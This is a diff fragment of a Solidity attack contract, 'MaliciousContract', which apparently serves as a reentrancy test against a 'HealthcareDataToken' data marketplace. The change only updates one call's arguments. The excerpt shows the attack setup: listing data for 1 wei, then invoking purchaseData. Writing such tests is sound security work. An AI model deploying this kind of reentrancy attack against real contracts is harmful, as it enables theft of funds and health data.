@@ -9,7 +9,7 @@ contract MaliciousContract {
     // This function will be called to perform the reentrant attack
     function attack(address _patient, address _healthCareDataTokenContractAddress) external payable {
         // Set the data for sale with a very low price to ensure the malicious contract can afford it
-        HealthcareDataToken(_healthCareDataTokenContractAddress).addHealthData("maliciousData", 1 wei,  block.timestamp + 3600);
+        HealthcareDataToken(_healthCareDataTokenContractAddress).addHealthData("name","maliciousData", 1 wei,  block.timestamp + 3600);
 
         // Initiate the purchaseData function in the target contract
         HealthcareDataToken(_healthCareDataTokenContractAddress).purchaseData{value: msg.value}(_patient);
